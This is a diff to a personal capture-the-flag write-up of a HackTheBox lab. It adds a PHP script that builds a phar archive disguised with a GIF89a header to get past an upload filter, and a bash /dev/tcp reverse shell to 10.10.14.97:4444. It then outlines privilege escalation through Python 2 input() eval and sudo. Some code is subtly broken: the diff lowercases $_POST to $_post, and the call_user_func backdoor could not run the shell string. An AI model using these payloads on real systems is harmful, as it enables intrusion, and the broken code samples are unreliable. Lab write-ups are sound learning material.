@@ -192,12 +192,12 @@ We recall that the script will append a `.php` extension at the end of it. We ca
 however we are also not allowed to upload any files ending in `.php`
 
 ```php
-if($_POST['check']){
+if($_post['check']){
     ...
-	# Check if extension is allowed.
-	$ext = getExtension($file);
+	# check if extension is allowed.
+	$ext = getextension($file);
 	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
-		die("Extension not allowed!");
+		die("extension not allowed!");
 	}
 }
 ```
@@ -214,7 +214,137 @@ we have a directory index!
 
 ![](.media/20260212150827.png)
 
-se a problem we have is we can view php files but we cannot upload php files. This is where the `phar://` protocol comes from maybe.
+se a problem we have is we can view php files but we cannot upload php files. this is where the `phar://` protocol comes from maybe.
+
+created a phar using the following script:-
+
+```php
+<?php
+/* $attacker_ip='10.10.14.97'; */
+/* $attacker_port='4444'; */
+$jpeg_artifact="./avatar.jpg";
+
+$phar = new Phar('attack.phar');
+$phar->startBuffering();
+
+/* $shell = "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/" . $attacker_ip . "/" . $attacker_port . " 0>&1\"'); ?>"; */
+$shell = file_get_contents('./php-reverse-shell.php');
+$phar->addFromString('attack.php', $shell);
+
+$info = "<?php phpinfo() ?>";
+$phar->addFromString('info.php', $info);
+
+$dangerous_fn = file_get_contents('./php-dangerous-functions.php');
+$phar->addFromString('danger.php', $dangerous_fn);
+
+/* $jpeg = file_get_contents($jpeg_artifact); */
+$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
+
+// add object of any class as meta data
+$phar->stopBuffering();
+```
+
+we are able to get phpinfo() to run
+
+![](.media/20260217072752.png)
+
+we get a list of dangerous functions that are able to run on this server:-
+
+```txt
+=== Dangerous PHP Functions Check === PHP Version: 8.0.20 --- CALLABLE --- 
+ - proc_open 
+ - assert 
+ - call_user_func 
+ - call_user_func_array 
+ - preg_replace_callback 
+ - spl_autoload_register 
+ - register_shutdown_function 
+ - register_tick_function 
+ - set_error_handler 
+ - set_exception_handler 
+ - array_map 
+ - array_filter 
+ - array_reduce 
+ - array_walk 
+ - array_walk_recursive 
+ - usort 
+ - uasort 
+ - uksort 
+ - iterator_apply 
+ - ob_start 
+ - phpinfo 
+ - posix_mkfifo 
+ - posix_getlogin 
+ - posix_ttyname 
+ - getenv 
+ - get_current_user 
+ - proc_get_status 
+ - get_cfg_var 
+ - disk_free_space 
+ - disk_total_space 
+ - getcwd 
+ - getmygid 
+ - getmyinode 
+ - getmypid 
+ - getmyuid 
+ - fopen 
+ - tmpfile 
+ - gzopen 
+ - chgrp 
+ - chmod 
+ - chown 
+ - copy 
+ - file_put_contents 
+ - mkdir 
+ - move_uploaded_file 
+ - rename 
+ - rmdir 
+ - tempnam 
+ - touch 
+ - unlink 
+ - file_get_contents 
+ - file 
+ - readfile 
+ - parse_ini_file 
+ - highlight_file 
+ - show_source 
+ - php_strip_whitespace 
+ - ftp_get 
+ - ftp_put 
+ - extract 
+ - parse_str 
+ - putenv 
+ - ini_set 
+ - header 
+ - proc_nice 
+ - proc_terminate 
+ - proc_close 
+ - pfsockopen 
+ - posix_kill 
+ - posix_setpgid 
+ - posix_setsid 
+ - posix_setuid
+```
+
+We are able to get a reverse shell by modifying our backdoor
+
+```php
+<?php call_user_func("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.97/4444 0>&1'"); ?>
+```
+
+once you get a shell, you have to go to /home/developer/dev or something like that
+
+there is a python 2 file that get run by a program with a SUID bit set as developer you have to use the exploit
+
+> Python 2 input() is basically eval() - use **import**("os").system("/bin/bash")
+
+and you are dev. Then there is so `easysetup` tool or something you have sudo to so you get root.
+
+then that's it. I am done with this box. I set myself free.
+
+I'm going to quit HTB for a few months to go to a platform that actually respects me as someone who is learning instead of being called "noob" because I use walkthroughs.
+
+to hell with this.
 
 # Retrospectives
 
